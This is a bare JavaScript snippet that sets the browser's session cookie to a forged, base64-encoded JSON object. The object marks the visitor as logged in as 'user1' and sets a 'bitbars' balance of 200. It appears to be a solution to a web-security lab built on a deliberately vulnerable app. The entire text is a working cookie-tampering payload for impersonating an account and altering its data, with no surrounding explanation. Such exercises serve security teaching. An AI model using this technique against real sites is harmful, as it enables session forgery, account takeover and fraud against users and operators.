document.cookie = "session=" + btoa(JSON.stringify(
    {
        "loggedIn": true,
        "account": {
            "username": "user1",
            "hashedPassword": "a random text",
            "salt": "21834708492970860368940710131560218741",
            "profile": "",
            "bitbars": 200
        }
    }
))